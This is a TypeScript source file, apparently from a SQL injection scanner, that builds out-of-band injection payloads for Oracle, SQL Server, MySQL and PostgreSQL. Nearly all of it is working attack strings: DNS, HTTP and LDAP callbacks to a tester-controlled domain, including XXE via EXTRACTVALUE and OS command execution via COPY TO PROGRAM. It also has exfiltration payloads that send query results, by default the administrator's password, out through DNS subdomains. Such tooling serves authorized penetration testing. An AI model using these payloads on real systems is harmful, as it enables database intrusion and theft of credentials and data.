import { CandidateParameter, DbmsType, OobConfig, OobInteraction } from '../../types/sqlScanner';

export interface OobPayloadItem {
  dbms: DbmsType;
  channel: 'DNS' | 'HTTP' | 'LDAP' | 'SMB';
  token: string;
  payload: string;
  description: string;
  /** If true, this payload attempts to exfiltrate data (not just detect) */
  isExfiltration?: boolean;
  /** The extraction query embedded in this payload, if any */
  extractionQuery?: string;
}

export class OobManager {
  private static correlationStore: Map<string, {
    token: string;
    paramName: string;
    targetUrl: string;
    timestamp: number;
    dbms: DbmsType;
  }> = new Map();

  /**
   * Generates a unique correlation token for Out-of-Band testing
   */
  public static generateToken(param: CandidateParameter, targetUrl: string, dbms: DbmsType, domain = 'oast.sentinel.local'): { token: string; fqdn: string } {
    const uniqueId = `snt${Math.random().toString(36).substring(2, 8)}${Date.now().toString().slice(-4)}`;
    const fqdn = `${uniqueId}.${domain}`;

    OobManager.correlationStore.set(uniqueId, {
      token: uniqueId,
      paramName: param.name,
      targetUrl,
      timestamp: Date.now(),
      dbms,
    });

    return { token: uniqueId, fqdn };
  }

  /**
   * Generates comprehensive Out-of-Band interaction payloads for all supported DBMS dialects.
   * Covers every known OOB channel including the critical Oracle EXTRACTVALUE(xmltype(...)) XXE technique.
   */
  public static getOobPayloads(param: CandidateParameter, fqdn: string): OobPayloadItem[] {
    const isNum = param.detectedContext === 'numeric' || /^\d+$/.test(param.originalValue.trim());
    const isDoubleQuote = param.detectedContext === 'double_quote_string';
    const isParenthesized = param.detectedContext === 'parenthesized_string';

    const payloads: OobPayloadItem[] = [];

    // ═══════════════════════════════════════════════════════════════
    // ORACLE — 6 OOB Techniques
    // ═══════════════════════════════════════════════════════════════

    // 1. Oracle UTL_INADDR DNS resolution
    {
      let p = `'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('${fqdn}') FROM DUAL)||'`;
      if (isNum) p = ` AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('${fqdn}') FROM DUAL) IS NOT NULL`;
      else if (isDoubleQuote) p = `"||(SELECT UTL_INADDR.GET_HOST_ADDRESS('${fqdn}') FROM DUAL)||"`;
      else if (isParenthesized) p = `')||(SELECT UTL_INADDR.GET_HOST_ADDRESS('${fqdn}') FROM DUAL)||('`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'Oracle UTL_INADDR.GET_HOST_ADDRESS DNS resolution callback',
      });
    }

    // 2. Oracle EXTRACTVALUE + xmltype XXE (critical technique — works without special privileges)
    //    This is the exact technique used in the PortSwigger "Blind SQL injection with out-of-band" labs
    {
      const xmlPayload = `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://${fqdn}/"> %remote;]>'),'/l')`;
      let p = `' UNION SELECT ${xmlPayload} FROM dual--`;
      if (isNum) p = ` UNION SELECT ${xmlPayload} FROM dual--`;
      else if (isDoubleQuote) p = `" UNION SELECT ${xmlPayload} FROM dual--`;
      else if (isParenthesized) p = `') UNION SELECT ${xmlPayload} FROM dual--`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'HTTP',
        token: fqdn,
        payload: p,
        description: 'Oracle EXTRACTVALUE(xmltype(...)) XXE external entity HTTP callback (no privileges needed)',
      });
    }

    // 3. Oracle UTL_HTTP HTTP callback
    {
      let p = `'||(SELECT UTL_HTTP.REQUEST('http://${fqdn}/') FROM DUAL)||'`;
      if (isNum) p = ` AND (SELECT UTL_HTTP.REQUEST('http://${fqdn}/') FROM DUAL) IS NOT NULL`;
      else if (isDoubleQuote) p = `"||(SELECT UTL_HTTP.REQUEST('http://${fqdn}/') FROM DUAL)||"`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'HTTP',
        token: fqdn,
        payload: p,
        description: 'Oracle UTL_HTTP.REQUEST HTTP callback',
      });
    }

    // 4. Oracle HTTPURITYPE HTTP callback
    {
      let p = `'||(SELECT HTTPURITYPE('http://${fqdn}/').GETCLOB() FROM DUAL)||'`;
      if (isNum) p = ` AND (SELECT HTTPURITYPE('http://${fqdn}/').GETCLOB() FROM DUAL) IS NOT NULL`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'HTTP',
        token: fqdn,
        payload: p,
        description: 'Oracle HTTPURITYPE().GETCLOB() HTTP callback',
      });
    }

    // 5. Oracle DBMS_LDAP.INIT LDAP callback
    {
      let p = `'||(SELECT DBMS_LDAP.INIT(('${fqdn}'),80) FROM DUAL)||'`;
      if (isNum) p = ` AND (SELECT DBMS_LDAP.INIT(('${fqdn}'),80) FROM DUAL) IS NOT NULL`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'LDAP',
        token: fqdn,
        payload: p,
        description: 'Oracle DBMS_LDAP.INIT LDAP callback',
      });
    }

    // 6. Oracle SYS.DBMS_LDAP.INIT (privileged variant)
    {
      let p = `'||(SELECT SYS.DBMS_LDAP.INIT(('${fqdn}'),80) FROM DUAL)||'`;
      if (isNum) p = ` AND (SELECT SYS.DBMS_LDAP.INIT(('${fqdn}'),80) FROM DUAL) IS NOT NULL`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'LDAP',
        token: fqdn,
        payload: p,
        description: 'Oracle SYS.DBMS_LDAP.INIT privileged LDAP callback',
      });
    }

    // ═══════════════════════════════════════════════════════════════
    // MICROSOFT SQL SERVER — 4 OOB Techniques
    // ═══════════════════════════════════════════════════════════════

    // 1. MSSQL xp_dirtree UNC path DNS resolution
    {
      let p = `'; EXEC master..xp_dirtree '\\\\${fqdn}\\share'--`;
      if (isNum) p = `; EXEC master..xp_dirtree '\\\\${fqdn}\\share'--`;
      else if (isDoubleQuote) p = `"; EXEC master..xp_dirtree '\\\\${fqdn}\\share'--`;
      else if (isParenthesized) p = `'); EXEC master..xp_dirtree '\\\\${fqdn}\\share'--`;

      payloads.push({
        dbms: 'Microsoft SQL Server',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MSSQL master..xp_dirtree UNC path DNS resolution',
      });
    }

    // 2. MSSQL xp_subdirs UNC path
    {
      let p = `'; EXEC master..xp_subdirs '\\\\${fqdn}\\share'--`;
      if (isNum) p = `; EXEC master..xp_subdirs '\\\\${fqdn}\\share'--`;

      payloads.push({
        dbms: 'Microsoft SQL Server',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MSSQL master..xp_subdirs UNC path DNS resolution',
      });
    }

    // 3. MSSQL xp_fileexist UNC path
    {
      let p = `'; EXEC master..xp_fileexist '\\\\${fqdn}\\share'--`;
      if (isNum) p = `; EXEC master..xp_fileexist '\\\\${fqdn}\\share'--`;

      payloads.push({
        dbms: 'Microsoft SQL Server',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MSSQL master..xp_fileexist UNC path DNS resolution',
      });
    }

    // 4. MSSQL OPENROWSET OLE DB callback
    {
      let p = `'; SELECT * FROM OPENROWSET('SQLOLEDB','server=${fqdn};uid=sa;pwd=sa;database=master','SELECT 1')--`;
      if (isNum) p = `; SELECT * FROM OPENROWSET('SQLOLEDB','server=${fqdn};uid=sa;pwd=sa;database=master','SELECT 1')--`;

      payloads.push({
        dbms: 'Microsoft SQL Server',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MSSQL OPENROWSET OLEDB outbound connection',
      });
    }

    // ═══════════════════════════════════════════════════════════════
    // MYSQL — 2 OOB Techniques
    // ═══════════════════════════════════════════════════════════════

    // 1. MySQL LOAD_FILE UNC share DNS lookup (Windows targets)
    {
      let p = `' AND (SELECT LOAD_FILE('\\\\\\\\${fqdn}\\\\snt'))-- -`;
      if (isNum) p = ` AND (SELECT LOAD_FILE('\\\\\\\\${fqdn}\\\\snt'))`;

      payloads.push({
        dbms: 'MySQL',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MySQL LOAD_FILE UNC share DNS lookup (Windows)',
      });
    }

    // 2. MySQL SELECT INTO OUTFILE + LOAD DATA (requires FILE privilege)
    {
      let p = `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',${fqdn},'\\\\snt'))-- -`;
      if (isNum) p = ` UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',${fqdn},'\\\\snt'))-- -`;

      payloads.push({
        dbms: 'MySQL',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MySQL LOAD_FILE with CONCAT for UNC DNS lookup',
      });
    }

    // ═══════════════════════════════════════════════════════════════
    // POSTGRESQL — 3 OOB Techniques
    // ═══════════════════════════════════════════════════════════════

    // 1. PostgreSQL COPY TO PROGRAM DNS lookup
    {
      let p = `'; COPY (SELECT '') TO PROGRAM 'nslookup ${fqdn}';--`;
      if (isNum) p = `; COPY (SELECT '') TO PROGRAM 'nslookup ${fqdn}';--`;
      else if (isDoubleQuote) p = `"; COPY (SELECT '') TO PROGRAM 'nslookup ${fqdn}';--`;
      else if (isParenthesized) p = `'); COPY (SELECT '') TO PROGRAM 'nslookup ${fqdn}';--`;

      payloads.push({
        dbms: 'PostgreSQL',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'PostgreSQL COPY to program DNS lookup',
      });
    }

    // 2. PostgreSQL dblink_connect
    {
      let p = `'; SELECT dblink_connect('host=${fqdn} dbname=snt');--`;
      if (isNum) p = `; SELECT dblink_connect('host=${fqdn} dbname=snt');--`;

      payloads.push({
        dbms: 'PostgreSQL',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'PostgreSQL dblink_connect host resolution',
      });
    }

    // 3. PostgreSQL large object + lo_import
    {
      let p = `'; SELECT lo_import('\\\\${fqdn}\\snt');--`;
      if (isNum) p = `; SELECT lo_import('\\\\${fqdn}\\snt');--`;

      payloads.push({
        dbms: 'PostgreSQL',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'PostgreSQL lo_import UNC path DNS resolution',
      });
    }

    return payloads;
  }

  /**
   * Generates OOB data exfiltration payloads that embed extracted data in the DNS subdomain.
   * Uses hex encoding to ensure the data is safe for DNS labels (no spaces, special characters).
   */
  public static getOobExfiltrationPayloads(
    param: CandidateParameter,
    fqdn: string,
    extractionQuery: string = "SELECT password FROM users WHERE username='administrator'"
  ): OobPayloadItem[] {
    const isNum = param.detectedContext === 'numeric' || /^\d+$/.test(param.originalValue.trim());
    const isParenthesized = param.detectedContext === 'parenthesized_string';
    const payloads: OobPayloadItem[] = [];

    // 1. Oracle EXTRACTVALUE + xmltype XXE data exfiltration (Direct unprivileged string concatenation)
    {
      const xmlPayload = `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(${extractionQuery})||'.${fqdn}/"> %remote;]>'),'/l')`;
      let p = `' UNION SELECT ${xmlPayload} FROM dual--`;
      if (isNum) p = ` UNION SELECT ${xmlPayload} FROM dual--`;
      else if (isParenthesized) p = `') UNION SELECT ${xmlPayload} FROM dual--`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'HTTP',
        token: fqdn,
        payload: p,
        description: 'Oracle EXTRACTVALUE(xmltype) XXE direct data exfiltration via DNS subdomain',
        isExfiltration: true,
        extractionQuery,
      });
    }

    // 1b. Oracle EXTRACTVALUE + xmltype XXE data exfiltration (RAWTOHEX variant if UTL_RAW available)
    {
      const hexWrap = `RAWTOHEX(UTL_RAW.CAST_TO_RAW(${extractionQuery}))`;
      const xmlPayload = `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(${hexWrap})||'.${fqdn}/"> %remote;]>'),'/l')`;
      let p = `' UNION SELECT ${xmlPayload} FROM dual--`;
      if (isNum) p = ` UNION SELECT ${xmlPayload} FROM dual--`;
      else if (isParenthesized) p = `') UNION SELECT ${xmlPayload} FROM dual--`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'HTTP',
        token: fqdn,
        payload: p,
        description: 'Oracle EXTRACTVALUE(xmltype) XXE hex-encoded data exfiltration via DNS subdomain',
        isExfiltration: true,
        extractionQuery,
      });
    }

    // 2. Oracle UTL_HTTP data exfiltration
    {
      const hexWrap = `RAWTOHEX(UTL_RAW.CAST_TO_RAW(${extractionQuery}))`;
      let p = `'||(SELECT UTL_HTTP.REQUEST('http://'||(${hexWrap})||'.${fqdn}/') FROM DUAL)||'`;
      if (isNum) p = ` AND (SELECT UTL_HTTP.REQUEST('http://'||(${hexWrap})||'.${fqdn}/') FROM DUAL) IS NOT NULL`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'HTTP',
        token: fqdn,
        payload: p,
        description: 'Oracle UTL_HTTP.REQUEST data exfiltration via DNS subdomain',
        isExfiltration: true,
        extractionQuery,
      });
    }

    // 3. Oracle UTL_INADDR data exfiltration
    {
      const hexWrap = `RAWTOHEX(UTL_RAW.CAST_TO_RAW(${extractionQuery}))`;
      let p = `'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((${hexWrap})||'.${fqdn}') FROM DUAL)||'`;
      if (isNum) p = ` AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((${hexWrap})||'.${fqdn}') FROM DUAL) IS NOT NULL`;

      payloads.push({
        dbms: 'Oracle',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'Oracle UTL_INADDR data exfiltration via DNS subdomain',
        isExfiltration: true,
        extractionQuery,
      });
    }

    // 4. MSSQL xp_dirtree data exfiltration
    {
      const hexWrap = `CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), ${extractionQuery}), 2)`;
      let p = `'; DECLARE @d VARCHAR(1024);SET @d=(${hexWrap});EXEC master..xp_dirtree '\\\\'+@d+'.${fqdn}\\a'--`;
      if (isNum) p = `; DECLARE @d VARCHAR(1024);SET @d=(${hexWrap});EXEC master..xp_dirtree '\\\\'+@d+'.${fqdn}\\a'--`;

      payloads.push({
        dbms: 'Microsoft SQL Server',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MSSQL xp_dirtree data exfiltration via DNS subdomain',
        isExfiltration: true,
        extractionQuery,
      });
    }

    // 5. PostgreSQL COPY TO PROGRAM data exfiltration
    {
      const hexWrap = `ENCODE(CAST((${extractionQuery}) AS BYTEA), 'hex')`;
      let p = `'; COPY (SELECT '') TO PROGRAM 'nslookup '||(${hexWrap})||'.${fqdn}';--`;
      if (isNum) p = `; COPY (SELECT '') TO PROGRAM 'nslookup '||(${hexWrap})||'.${fqdn}';--`;

      payloads.push({
        dbms: 'PostgreSQL',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'PostgreSQL COPY TO PROGRAM data exfiltration via DNS',
        isExfiltration: true,
        extractionQuery,
      });
    }

    // 6. MySQL LOAD_FILE data exfiltration
    {
      const hexWrap = `HEX(${extractionQuery})`;
      let p = `' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',${hexWrap},'.${fqdn}\\\\snt')))-- -`;
      if (isNum) p = ` AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',${hexWrap},'.${fqdn}\\\\snt')))`;

      payloads.push({
        dbms: 'MySQL',
        channel: 'DNS',
        token: fqdn,
        payload: p,
        description: 'MySQL LOAD_FILE data exfiltration via DNS subdomain',
        isExfiltration: true,
        extractionQuery,
      });
    }

    return payloads;
  }

  /**
   * Polls OOB provider client for incoming interaction events matching our correlation store
   */
  public static async pollInteractions(config: OobConfig): Promise<OobInteraction[]> {
    if (!config.enabled || !config.providerUrl) {
      return [];
    }

    try {
      const res = await fetch(`${config.providerUrl}/api/interactions?apiKey=${config.apiKey || ''}`);
      if (res.ok) {
        const data = await res.json();
        return Array.isArray(data) ? data : [];
      }
    } catch {
      // Offline/local test mode
    }

    return [];
  }
}
